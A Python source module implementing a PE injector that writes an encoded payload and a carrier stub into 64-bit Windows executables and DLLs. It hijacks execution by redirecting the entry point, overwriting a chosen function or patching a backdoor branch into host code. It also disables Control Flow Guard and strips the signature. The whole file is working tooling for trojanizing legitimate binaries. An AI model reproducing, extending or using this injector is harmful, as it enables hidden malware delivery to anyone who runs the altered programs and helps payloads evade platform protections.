from __future__ import annotations

import math
import shutil
from collections import Counter
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import pefile

from ..artifacts import (
    CarrierArtifact,
    sha256_bytes,
    sha256_file,
    write_json,
)
from ..injectables import collect_import_slots, plan_iat_repairs
from .fixups import encode_iat_reference, encode_rip_lea
from .image import (
    IMAGE_DLLCHARACTERISTICS_GUARD_CF,
    PEImage,
    PEValidationError,
)
from .invocation import (
    BackdoorSite,
    InvocationError,
    InvocationTarget,
    find_backdoor_site,
    resolve_invocation_target,
)
from .planner import (
    HostLayout,
    PlacementDecision,
    PlacementPlan,
    PlacementPlanner,
    PlacementRequest,
    conflicting_exclusions,
    discover_host_layout,
)
from .ranges import Range, align_up


def _entropy(value: bytes) -> float:
    if not value:
        return 0.0
    length = len(value)
    return -sum(
        (count / length) * math.log2(count / length)
        for count in Counter(value).values()
    )


@dataclass
class InjectionResult:
    output: Path
    carrier_rva: int
    carrier_entry_rva: int
    payload_rva: int
    destination_rva: int | None
    data_end_rva: int
    entrypoint_rva: int
    original_entrypoint_rva: int
    payload_alignment: int
    payload_location: str
    placement_mode: str
    iat_policy: str
    host_kind: str
    iat_repairs: list[dict[str, int | str]]
    overwritten_path: Path
    overwritten_regions: tuple[dict[str, Any], ...]
    placement_plan: dict[str, Any]
    invocation: dict[str, Any]
    signature: dict[str, int]
    control_flow_guard: dict[str, int | bool | None]
    section: dict[str, Any]
    unsigned_output_size: int
    unsigned_output_sha256: str
    unsigned_evidence_path: Path

    def to_dict(self) -> dict[str, Any]:
        return {
            "output": str(self.output),
            "output_size": self.output.stat().st_size,
            "output_sha256": sha256_file(self.output),
            "unsigned_output_size": self.unsigned_output_size,
            "unsigned_output_sha256": self.unsigned_output_sha256,
            "unsigned_evidence_path": str(self.unsigned_evidence_path),
            "carrier_rva": self.carrier_rva,
            "carrier_entry_rva": self.carrier_entry_rva,
            "payload_rva": self.payload_rva,
            "destination_rva": self.destination_rva,
            "data_end_rva": self.data_end_rva,
            "entrypoint_rva": self.entrypoint_rva,
            "original_entrypoint_rva": self.original_entrypoint_rva,
            "payload_alignment": self.payload_alignment,
            "payload_location": self.payload_location,
            "placement_mode": self.placement_mode,
            "iat_policy": self.iat_policy,
            "host_kind": self.host_kind,
            "iat_repairs": self.iat_repairs,
            "overwritten_path": str(self.overwritten_path),
            "overwritten_regions": [
                dict(item) for item in self.overwritten_regions
            ],
            "placement_plan": self.placement_plan,
            "invocation": self.invocation,
            "invalidated_signature": self.signature,
            "control_flow_guard": self.control_flow_guard,
            "section": self.section,
        }


class PEInjector:
    @staticmethod
    def _validate_fixup_contract(carrier: CarrierArtifact) -> None:
        if not carrier.code:
            raise PEValidationError("carrier code is empty")
        if not 0 <= carrier.entry_offset < len(carrier.code):
            raise PEValidationError("carrier entry offset is outside its code")

        claimed: list[tuple[int, int, str]] = []

        def claim(
            offset: int | None,
            size: int,
            placeholder: bytes,
            label: str,
        ) -> None:
            if offset is None:
                raise PEValidationError(f"unlocated {label}")
            if offset < 0 or offset + size > len(carrier.code):
                raise PEValidationError(f"{label} is outside carrier code")
            if len(placeholder) != size:
                raise PEValidationError(
                    f"{label} placeholder has size {len(placeholder)}, "
                    f"expected {size}"
                )
            if carrier.code[offset : offset + size] != placeholder:
                raise PEValidationError(
                    f"{label} placeholder does not match carrier code"
                )
            for existing_start, existing_end, existing_label in claimed:
                if offset < existing_end and existing_start < offset + size:
                    raise PEValidationError(
                        f"{label} overlaps {existing_label} in carrier code"
                    )
            claimed.append((offset, offset + size, label))

        import_sizes = {"call_iat": 6, "jump_iat": 6, "load_iat": 7}
        for fixup in carrier.import_fixups:
            size = import_sizes.get(fixup.kind)
            if size is None:
                raise PEValidationError(
                    f"unsupported import fixup kind {fixup.kind}"
                )
            if fixup.kind == "load_iat" and not fixup.register:
                raise PEValidationError(
                    f"IAT load fixup {fixup.name} has no destination register"
                )
            claim(
                fixup.code_offset,
                size,
                fixup.placeholder,
                f"import fixup {fixup.dll}!{fixup.name}",
            )

        for data_fixup in carrier.data_fixups:
            if data_fixup.target not in {"data", "payload", "destination"}:
                raise PEValidationError(
                    f"data fixup {data_fixup.name} has unknown target "
                    f"{data_fixup.target}"
                )
            if (
                data_fixup.target in {"payload", "destination"}
                and data_fixup.data
            ):
                raise PEValidationError(
                    f"{data_fixup.target} fixup {data_fixup.name} "
                    "unexpectedly embeds data"
                )
            if not data_fixup.references:
                raise PEValidationError(
                    f"data fixup {data_fixup.name} has no carrier references"
                )
            for index, reference in enumerate(data_fixup.references):
                if data_fixup.target in {"payload", "destination"}:
                    valid_target = reference.target_offset == 0
                else:
                    valid_target = (
                        0 <= reference.target_offset < len(data_fixup.data)
                    )
                if not valid_target:
                    raise PEValidationError(
                        f"data fixup {data_fixup.name} has an out-of-range "
                        "target offset"
                    )
                claim(
                    reference.code_offset,
                    7,
                    reference.placeholder,
                    f"data fixup {data_fixup.name} reference {index}",
                )
        payload_fixups = [
            data_fixup
            for data_fixup in carrier.data_fixups
            if data_fixup.target == "payload"
        ]
        if len(payload_fixups) != 1:
            raise PEValidationError(
                "carrier must contain exactly one referenced payload fixup"
            )
        destination_fixups = [
            data_fixup
            for data_fixup in carrier.data_fixups
            if data_fixup.target == "destination"
        ]
        if len(destination_fixups) > 1:
            raise PEValidationError(
                "carrier may contain at most one referenced destination fixup"
            )

    @staticmethod
    def _repair_contract(
        values: tuple[dict[str, Any], ...],
    ) -> tuple[tuple[str, str, str, int], ...]:
        return tuple(
            (
                str(item["dll"]).lower(),
                str(item["old_name"]).lower(),
                str(item["new_name"]).lower(),
                int(item["name_offset"]),
            )
            for item in values
        )

    @staticmethod
    def _target_and_site(
        image: PEImage,
        invocation_target: str,
        invocation_strategy: str,
        dll_export: str | None,
    ) -> tuple[InvocationTarget, BackdoorSite | None]:
        try:
            target = resolve_invocation_target(
                image.pe,
                invocation_target,
                dll_export,
                require_function_bounds=(
                    invocation_strategy == "backdoor"
                    or invocation_strategy == "target_overwrite"
                    or invocation_target == "export"
                ),
            )
            site = (
                find_backdoor_site(image.pe, target)
                if invocation_strategy == "backdoor"
                else None
            )
            return target, site
        except (InvocationError, UnicodeDecodeError) as exc:
            raise PEValidationError(str(exc)) from exc

    @staticmethod
    def _plan(
        image: PEImage,
        layout: HostLayout,
        carrier: CarrierArtifact,
        encoded_payload: bytes,
        payload_alignment: int,
        payload_location: str,
        page_isolation: bool,
        placement_mode: str,
        execution_alignment: int,
        invocation_strategy: str,
        invocation_target: str,
        target: InvocationTarget,
    ) -> PlacementPlan:
        planner = PlacementPlanner(layout)
        requests: list[PlacementRequest] = []
        decisions: list[PlacementDecision] = []

        payload_reserve_size = (
            align_up(len(encoded_payload), payload_alignment)
            if page_isolation and placement_mode == "in_place"
            else None
        )
        payload_request = PlacementRequest(
            "payload",
            len(encoded_payload),
            payload_alignment,
            payload_location,
            reserve_size=payload_reserve_size,
        )
        requests.append(payload_request)
        decisions.append(planner.allocate(payload_request))
        reservations: list[dict[str, Any]] = []
        if payload_reserve_size is not None:
            payload_decision = decisions[-1]
            reserved_end = payload_decision.start + payload_reserve_size
            reserved = Range(payload_decision.start, reserved_end)
            reservations.append(
                {
                    "name": "payload_execution_pages",
                    "start_rva": reserved.start,
                    "end_rva": reserved.end,
                    "size": reserved.size,
                    "reason": (
                        "keep executing carrier code outside pages made "
                        "temporarily writable by the in-place memory module"
                    ),
                }
            )

        if placement_mode == "split_image":
            destination_reserve_size = (
                align_up(len(encoded_payload), execution_alignment)
                if page_isolation
                else None
            )
            destination_request = PlacementRequest(
                "destination",
                len(encoded_payload),
                execution_alignment,
                "code",
                reserve_size=destination_reserve_size,
            )
            requests.append(destination_request)
            decisions.append(planner.allocate(destination_request))
            if destination_reserve_size is not None:
                destination_decision = decisions[-1]
                reservations.append(
                    {
                        "name": "payload_execution_pages",
                        "start_rva": destination_decision.start,
                        "end_rva": (
                            destination_decision.start
                            + destination_reserve_size
                        ),
                        "size": destination_reserve_size,
                        "reason": (
                            "keep encoded payload data and executing carrier "
                            "code outside image pages used as the decoded "
                            "execution destination"
                        ),
                    }
                )

        fixed_carrier = (
            invocation_strategy == "target_overwrite"
            or (
                invocation_strategy == "overwrite"
                and invocation_target == "export"
            )
        )
        carrier_request = PlacementRequest(
            "carrier",
            len(carrier.code),
            1 if fixed_carrier else 16,
            "code",
            (
                target.rva - carrier.entry_offset
                if fixed_carrier
                else None
            ),
        )
        requests.append(carrier_request)
        if fixed_carrier:
            selected_reason = (
                f"export_function:0x{target.rva:X}"
                if invocation_target == "export"
                else f"entry_function:0x{target.rva:X}"
            )
            selected_target_reason = (
                f"export_target:0x{target.rva:X}"
                if invocation_target == "export"
                else f"entry_target:0x{target.rva:X}"
            )
            decisions.append(
                planner.allocate_override(
                    carrier_request,
                    {
                        selected_reason,
                        selected_target_reason,
                    },
                )
            )
        else:
            decisions.append(planner.allocate(carrier_request))

        for index, data_fixup in enumerate(carrier.data_fixups):
            if data_fixup.target == "payload" or not data_fixup.data:
                continue
            request = PlacementRequest(
                f"compiler_data:{index}:{data_fixup.name}",
                len(data_fixup.data),
                8,
                "rdata",
            )
            requests.append(request)
            try:
                decisions.append(planner.allocate(request))
            except ValueError:
                # Compiler constants may use an executable IMAGE range when a
                # host has no independently usable read-only interval.
                fallback = PlacementRequest(
                    request.name,
                    request.size,
                    request.alignment,
                    "code",
                )
                requests[-1] = fallback
                decisions.append(planner.allocate(fallback))

        return PlacementPlan(
            layout,
            decisions,
            tuple(requests),
            tuple(reservations),
        )

    @staticmethod
    def _region_evidence(
        image: PEImage,
        artifact_dir: Path,
        name: str,
        start_rva: int,
        replacement: bytes,
        section_name: str,
    ) -> dict[str, Any]:
        offset = image.rva_to_offset(start_rva)
        original = image.original_bytes[offset : offset + len(replacement)]
        if len(original) != len(replacement):
            raise PEValidationError(
                f"overwritten region {name} is not fully file-backed"
            )
        safe_name = "".join(
            character if character.isalnum() or character in "-_" else "_"
            for character in name
        )
        retained = artifact_dir / f"original-{safe_name}.bin"
        retained.write_bytes(original)
        return {
            "name": name,
            "section": section_name,
            "start_rva": start_rva,
            "end_rva": start_rva + len(replacement),
            "file_offset": offset,
            "size": len(replacement),
            "original_sha256": sha256_bytes(original),
            "original_entropy": _entropy(original),
            "replacement_sha256": sha256_bytes(replacement),
            "replacement_entropy": _entropy(replacement),
            "retained_path": str(retained),
        }

    def inject(
        self,
        host: Path,
        output: Path,
        artifact_dir: Path,
        carrier: CarrierArtifact,
        encoded_payload: bytes,
        payload_alignment: int = 16,
        payload_location: str = "code",
        page_isolation: bool = False,
        placement_mode: str = "in_place",
        execution_alignment: int = 16,
        iat_policy: str = "auto",
        invocation_strategy: str = "overwrite",
        invocation_target: str = "entrypoint",
        process_attach_behavior: str | None = None,
        dll_export: str | None = None,
        host_kind: str = "exe",
        expected_iat_repairs: tuple[dict[str, Any], ...] | None = None,
        expected_host_sha256: str | None = None,
        expected_layout_digest: str | None = None,
        expected_payload_rva: int | None = None,
        expected_destination_rva: int | None = None,
        expected_backdoor_site: dict[str, Any] | None = None,
    ) -> InjectionResult:
        if iat_policy not in {"auto", "reuse_only"}:
            raise PEValidationError(
                "iat_policy must be auto or reuse_only"
            )
        if payload_location not in {"code", "rdata"}:
            raise PEValidationError(
                "effective payload location must be code or rdata"
            )
        if placement_mode not in {"in_place", "allocation", "split_image"}:
            raise PEValidationError("unsupported memory placement mode")
        if placement_mode == "split_image" and payload_location != "rdata":
            raise PEValidationError(
                "split-image placement requires a read-only payload source"
            )
        if invocation_strategy not in {
            "overwrite",
            "backdoor",
            "target_overwrite",
        }:
            raise PEValidationError(
                "invocation strategy must be overwrite, target_overwrite, "
                "or backdoor"
            )
        if invocation_target not in {"entrypoint", "dllmain", "export"}:
            raise PEValidationError("unsupported invocation target")

        image = PEImage(host)
        if (
            expected_host_sha256 is not None
            and sha256_bytes(image.original_bytes) != expected_host_sha256
        ):
            raise PEValidationError(
                "injectable hash changed after compatibility validation"
            )
        image.validate_host(host_kind)
        self._validate_fixup_contract(carrier)
        destination_fixups = [
            item for item in carrier.data_fixups
            if item.target == "destination"
        ]
        if placement_mode == "split_image" and len(destination_fixups) != 1:
            raise PEValidationError(
                "split-image carrier requires one execution destination fixup"
            )
        if placement_mode != "split_image" and destination_fixups:
            raise PEValidationError(
                "non-split carrier unexpectedly references an execution destination"
            )
        layout = discover_host_layout(image.pe)
        if (
            expected_layout_digest is not None
            and layout.digest != expected_layout_digest
        ):
            raise PEValidationError(
                "PE placement inventory changed after compatibility validation"
            )

        target, backdoor_site = self._target_and_site(
            image,
            invocation_target,
            invocation_strategy,
            dll_export,
        )
        if backdoor_site is not None:
            allowed_reason = (
                f"export_function:0x{target.rva:X}"
                if invocation_target == "export"
                else f"entry_function:0x{target.rva:X}"
            )
            conflicts = conflicting_exclusions(
                layout,
                Range(
                    backdoor_site.rva,
                    backdoor_site.rva + backdoor_site.size,
                ),
                {allowed_reason},
            )
            if conflicts:
                raise PEValidationError(
                    "selected backdoor branch overlaps protected "
                    f"{conflicts[0].reason} metadata"
                )
        if expected_backdoor_site is not None:
            if backdoor_site is None:
                raise PEValidationError(
                    "compatibility expected a backdoor site but none was selected"
                )
            expected_contract = (
                int(expected_backdoor_site["rva"]),
                str(expected_backdoor_site["original_bytes"]).lower(),
            )
            actual_contract = (
                backdoor_site.rva,
                backdoor_site.original_bytes.hex(),
            )
            if expected_contract != actual_contract:
                raise PEValidationError(
                    "function backdoor site changed after compatibility validation"
                )

        required_imports = {
            (fixup.dll.lower(), fixup.name.lower()): (fixup.dll, fixup.name)
            for fixup in carrier.import_fixups
        }
        protected_by_dll: dict[str, set[str]] = {}
        for dll_lower, name_lower in required_imports:
            protected_by_dll.setdefault(dll_lower, set()).add(name_lower)

        missing_imports, planned_repairs, repair_error = plan_iat_repairs(
            collect_import_slots(image.pe),
            required_imports.values(),
        )
        if repair_error is not None:
            raise PEValidationError(repair_error)
        if expected_iat_repairs is not None and self._repair_contract(
            planned_repairs
        ) != self._repair_contract(expected_iat_repairs):
            raise PEValidationError(
                "IAT repair plan changed after compatibility validation"
            )
        if missing_imports and iat_policy == "reuse_only":
            raise PEValidationError(
                f"host does not import required API {missing_imports[0]}; "
                "iat_policy=reuse_only forbids repair"
            )

        iat_repairs: list[dict[str, int | str]] = []
        if iat_policy == "auto":
            for planned in planned_repairs:
                dll = str(planned["dll"])
                name = str(planned["new_name"])
                actual = image.repair_import_name(
                    dll,
                    name,
                    protected_by_dll[dll.lower()],
                )
                if (
                    str(actual["old_name"]).lower()
                    != str(planned["old_name"]).lower()
                    or int(actual["name_offset"])
                    != int(planned["name_offset"])
                ):
                    raise PEValidationError(
                        f"IAT repair execution diverged for {dll}!{name}"
                    )
                iat_repairs.append(actual)

        placement = self._plan(
            image,
            layout,
            carrier,
            encoded_payload,
            payload_alignment,
            payload_location,
            page_isolation,
            placement_mode,
            execution_alignment,
            invocation_strategy,
            invocation_target,
            target,
        )
        if placement.layout.digest != layout.digest:
            raise PEValidationError(
                "placement planner used a divergent host inventory"
            )
        payload_decision = placement.allocation("payload")
        destination_decision = (
            placement.allocation("destination")
            if placement_mode == "split_image"
            else None
        )
        carrier_decision = placement.allocation("carrier")
        if (
            expected_payload_rva is not None
            and payload_decision.start != expected_payload_rva
        ):
            raise PEValidationError(
                "payload placement changed after compatibility validation"
            )
        if (
            expected_destination_rva is not None
            and (
                destination_decision is None
                or destination_decision.start != expected_destination_rva
            )
        ):
            raise PEValidationError(
                "execution destination changed after compatibility validation"
            )

        data_decisions = {
            item.name: item
            for item in placement.allocations
            if item.name.startswith("compiler_data:")
        }
        for index, data_fixup in enumerate(carrier.data_fixups):
            if data_fixup.target == "payload":
                data_fixup.rva = payload_decision.start
                data_fixup.file_offset = image.rva_to_offset(
                    payload_decision.start
                )
            elif data_fixup.target == "destination":
                if destination_decision is None:
                    raise PEValidationError(
                        "destination fixup has no split-image placement"
                    )
                data_fixup.rva = destination_decision.start
                data_fixup.file_offset = image.rva_to_offset(
                    destination_decision.start
                )
            elif data_fixup.data:
                decision = data_decisions[
                    f"compiler_data:{index}:{data_fixup.name}"
                ]
                data_fixup.rva = decision.start
                data_fixup.file_offset = image.rva_to_offset(decision.start)

        patched = bytearray(carrier.code)
        for fixup in carrier.import_fixups:
            if fixup.code_offset is None:
                raise PEValidationError(
                    f"unlocated import fixup {fixup.name}"
                )
            target_va = image.iat_va(fixup.dll, fixup.name)
            if target_va is None:
                raise PEValidationError(
                    f"host does not import required API "
                    f"{fixup.dll}!{fixup.name}"
                )
            instruction_va = (
                image.image_base
                + carrier_decision.start
                + fixup.code_offset
            )
            instruction, displacement = encode_iat_reference(
                fixup.kind,
                instruction_va,
                target_va,
                fixup.register,
            )
            patched[
                fixup.code_offset : fixup.code_offset + len(instruction)
            ] = instruction
            fixup.instruction_va = instruction_va
            fixup.target_va = target_va
            fixup.displacement = displacement

        for data_fixup in carrier.data_fixups:
            if data_fixup.rva is None:
                raise PEValidationError(
                    f"data fixup {data_fixup.name} has no placement"
                )
            for reference in data_fixup.references:
                if reference.code_offset is None:
                    raise PEValidationError(
                        f"unlocated data fixup {data_fixup.name}"
                    )
                target_va = (
                    image.image_base
                    + data_fixup.rva
                    + reference.target_offset
                )
                instruction_va = (
                    image.image_base
                    + carrier_decision.start
                    + reference.code_offset
                )
                instruction, displacement = encode_rip_lea(
                    reference.register,
                    instruction_va,
                    target_va,
                )
                patched[
                    reference.code_offset : reference.code_offset + 7
                ] = instruction
                reference.instruction_va = instruction_va
                reference.target_va = target_va
                reference.displacement = displacement

        artifact_dir.mkdir(parents=True, exist_ok=True)
        replacements: list[tuple[str, PlacementDecision, bytes]] = [
            ("payload", payload_decision, encoded_payload),
            ("carrier", carrier_decision, bytes(patched)),
        ]
        for index, data_fixup in enumerate(carrier.data_fixups):
            if (
                data_fixup.target in {"payload", "destination"}
                or not data_fixup.data
            ):
                continue
            decision = data_decisions[
                f"compiler_data:{index}:{data_fixup.name}"
            ]
            replacements.append(
                (decision.name, decision, data_fixup.data)
            )

        overwritten: list[dict[str, Any]] = []
        for name, decision, replacement in replacements:
            overwritten.append(
                self._region_evidence(
                    image,
                    artifact_dir,
                    name,
                    decision.start,
                    replacement,
                    decision.section.name,
                )
            )

        carrier_entry_rva = (
            carrier_decision.start + carrier.entry_offset
        )
        invocation_replacement: bytes | None = None
        invocation_displacement: int | None = None
        if backdoor_site is not None:
            invocation_replacement, invocation_displacement = (
                backdoor_site.replacement(
                    image.image_base, carrier_entry_rva
                )
            )
            site_section = layout.section_for_rva(
                backdoor_site.rva, backdoor_site.size
            )
            if site_section is None:
                raise PEValidationError(
                    "backdoor site is outside mapped host sections"
                )
            overwritten.append(
                self._region_evidence(
                    image,
                    artifact_dir,
                    "invocation_patch",
                    backdoor_site.rva,
                    invocation_replacement,
                    site_section.name,
                )
            )

        image.write_rva(carrier_decision.start, bytes(patched))
        image.write_rva(payload_decision.start, encoded_payload)
        for data_fixup in carrier.data_fixups:
            if (
                data_fixup.target not in {"payload", "destination"}
                and data_fixup.data
                and data_fixup.rva is not None
            ):
                image.write_rva(data_fixup.rva, data_fixup.data)

        original_entrypoint = image.entrypoint_rva
        if invocation_strategy == "backdoor":
            if backdoor_site is None or invocation_replacement is None:
                raise PEValidationError(
                    "backdoor invocation has no verified patch"
                )
            image.write_rva(backdoor_site.rva, invocation_replacement)
            new_entrypoint = original_entrypoint
        elif (
            invocation_strategy == "target_overwrite"
            or invocation_target == "export"
        ):
            if carrier_entry_rva != target.rva:
                raise PEValidationError(
                    "target overwrite did not place the carrier entry at "
                    "the selected function"
                )
            new_entrypoint = original_entrypoint
        else:
            new_entrypoint = carrier_entry_rva
            image.set_entrypoint(new_entrypoint)

        control_flow_guard = image.disable_control_flow_guard()
        signature = image.clear_invalid_signature()
        image.write(output)

        verification = pefile.PE(str(output), fast_load=False)
        verification.parse_data_directories()
        try:
            if (
                verification.FILE_HEADER.Machine
                != pefile.MACHINE_TYPE["IMAGE_FILE_MACHINE_AMD64"]
            ):
                raise PEValidationError(
                    "output verification found a non-AMD64 PE"
                )
            if (
                int(verification.OPTIONAL_HEADER.AddressOfEntryPoint)
                != new_entrypoint
            ):
                raise PEValidationError(
                    "output entry point does not match the invocation contract"
                )
            if (
                verification.OPTIONAL_HEADER.DllCharacteristics
                & IMAGE_DLLCHARACTERISTICS_GUARD_CF
            ):
                raise PEValidationError(
                    "output still enables Control Flow Guard"
                )
            output_is_dll = bool(
                verification.FILE_HEADER.Characteristics & 0x2000
            )
            if output_is_dll != (host_kind == "dll"):
                raise PEValidationError(
                    "output host kind changed during injection"
                )
            for repair in iat_repairs:
                actual = PEImage(output).iat_va(
                    str(repair["dll"]), str(repair["new_name"])
                )
                if actual != int(repair["iat_va"]):
                    raise PEValidationError(
                        "reparsed IAT repair target changed"
                    )
        finally:
            verification.close()

        output_bytes = output.read_bytes()
        for name, decision, replacement in replacements:
            start = image.rva_to_offset(decision.start)
            if (
                output_bytes[start : start + len(replacement)]
                != replacement
            ):
                raise PEValidationError(
                    f"output {name} bytes failed verification"
                )
        if backdoor_site is not None and invocation_replacement is not None:
            start = image.rva_to_offset(backdoor_site.rva)
            if (
                output_bytes[start : start + len(invocation_replacement)]
                != invocation_replacement
            ):
                raise PEValidationError(
                    "output invocation patch failed verification"
                )

        legacy_overwritten = artifact_dir / "original-overwritten-region.bin"
        legacy_overwritten.write_bytes(
            b"".join(
                Path(str(item["retained_path"])).read_bytes()
                for item in sorted(
                    overwritten,
                    key=lambda value: int(value["start_rva"]),
                )
            )
        )
        placement_path = artifact_dir / "placement-plan.json"
        placement_evidence = {
            **placement.to_dict(),
            "placement_mode": placement_mode,
        }
        write_json(placement_path, placement_evidence)

        unsigned_evidence_path = (
            artifact_dir
            / f"deterministic-unsigned-output{output.suffix.lower()}"
        )
        if unsigned_evidence_path.resolve() == output.resolve():
            raise PEValidationError(
                "unsigned evidence path collides with the staged output"
            )
        shutil.copyfile(output, unsigned_evidence_path)
        if sha256_file(unsigned_evidence_path) != sha256_file(output):
            raise PEValidationError(
                "retained unsigned output failed hash verification"
            )

        invocation_evidence = {
            "strategy": invocation_strategy,
            "target": target.to_dict(),
            "carrier_entry_rva": carrier_entry_rva,
            "address_of_entry_point_before": original_entrypoint,
            "address_of_entry_point_after": new_entrypoint,
            "preserves_address_of_entry_point": (
                new_entrypoint == original_entrypoint
            ),
            "original_host_code_continues": False,
            "process_attach_behavior": (
                process_attach_behavior
            ),
            "backdoor": (
                {
                    **backdoor_site.to_dict(),
                    "replacement_bytes": invocation_replacement.hex(),
                    "replacement_displacement": invocation_displacement,
                    "replacement_target_rva": carrier_entry_rva,
                    "reachability": "rel32",
                }
                if backdoor_site is not None
                and invocation_replacement is not None
                else None
            ),
        }
        carrier_section = carrier_decision.section
        return InjectionResult(
            output=output,
            carrier_rva=carrier_decision.start,
            carrier_entry_rva=carrier_entry_rva,
            payload_rva=payload_decision.start,
            destination_rva=(
                destination_decision.start
                if destination_decision is not None
                else None
            ),
            data_end_rva=max(
                item.end for item in placement.allocations
            ),
            entrypoint_rva=new_entrypoint,
            original_entrypoint_rva=original_entrypoint,
            payload_alignment=payload_alignment,
            payload_location=payload_location,
            placement_mode=placement_mode,
            iat_policy=iat_policy,
            host_kind=host_kind,
            iat_repairs=iat_repairs,
            overwritten_path=legacy_overwritten,
            overwritten_regions=tuple(overwritten),
            placement_plan={
                **placement_evidence,
                "retained_path": str(placement_path),
            },
            invocation=invocation_evidence,
            signature=signature,
            control_flow_guard=control_flow_guard,
            unsigned_output_size=output.stat().st_size,
            unsigned_output_sha256=sha256_file(output),
            unsigned_evidence_path=unsigned_evidence_path,
            section={
                "name": carrier_section.name,
                "rva": carrier_section.rva,
                "virtual_size": carrier_section.size,
                "raw_offset": carrier_section.raw_offset,
                "raw_size": carrier_section.size,
                "mapped_file_size": carrier_section.size,
                "overwritten_size": len(patched),
                "overwritten_sha256": next(
                    item["original_sha256"]
                    for item in overwritten
                    if item["name"] == "carrier"
                ),
            },
        )

